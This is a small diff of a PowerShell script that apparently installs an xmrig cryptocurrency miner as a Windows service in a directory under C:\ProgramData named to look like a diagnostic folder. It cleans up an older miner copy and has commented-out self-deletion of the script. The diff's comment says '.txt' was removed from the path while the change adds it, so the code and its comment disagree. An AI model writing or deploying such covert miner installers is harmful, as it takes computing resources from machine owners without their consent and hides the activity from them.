@@ -3,7 +3,7 @@ $currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Nam
 Write-Host "Current user: $currentUserName"
 
 # Define target directory - fixed the path (removed .txt)
-$targetDir = "C:\ProgramData\.diagnostic\"
+$targetDir = "C:\ProgramData\.diagnostic.txt\"
 $oldMinerPath = "C:\Users\$currentUserName\xmrig.exe"
 
 # Step 1: Clean up old files
@@ -277,5 +277,6 @@ Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gr
 # } catch {
 #     Write-Host "Could not remove script file." -ForegroundColor Yellow
 # }
+
 
 
